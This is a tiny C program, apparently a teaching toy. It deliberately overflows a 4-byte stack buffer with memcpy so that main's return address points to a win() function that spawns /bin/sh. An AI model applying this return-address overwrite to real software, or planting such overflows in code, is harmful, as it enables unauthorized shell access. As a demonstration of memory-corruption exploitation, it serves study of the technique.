// gcc hacked_toy.c -O0 -o hacked_toy.out
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

// Call for a shell
void win() {
	system("/bin/sh");
}

// Overwrite main's return address
int main() {
	char buf[4];
	memcpy(buf + 36, "\x9b\x84\x04\x08", sizeof(void*));
	return 0;
}
